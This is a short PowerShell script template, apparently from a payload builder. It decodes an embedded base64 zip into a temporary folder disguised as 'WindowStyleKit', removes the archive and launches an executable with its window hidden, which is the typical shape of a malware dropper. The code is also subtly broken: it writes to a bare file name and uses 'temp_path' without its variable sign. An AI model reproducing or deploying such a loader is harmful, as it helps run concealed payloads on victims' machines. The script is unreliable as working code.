$exec = %exec%
$base64String = %b64zip%

$temp = New-TemporaryFile
$tempName = $temp.Name + ".zip"
$temp_path = $temp.DirectoryName

Rename-Item -Path $temp.Fullname -NewName ($temp.Name + ".zip")

$bytes = [System.Convert]::FromBase64String($base64String)

Set-Content -Path $tempName -Value $bytes -Encoding Byte

Expand-Archive -Path $tempName -DestinationPath (Join-Path $temp_path "WindowStyleKit")
Remove-Item $tempName

Set-Location temp_path\WindowStyleKit
Start-Process $exec -WindowStyle Hidden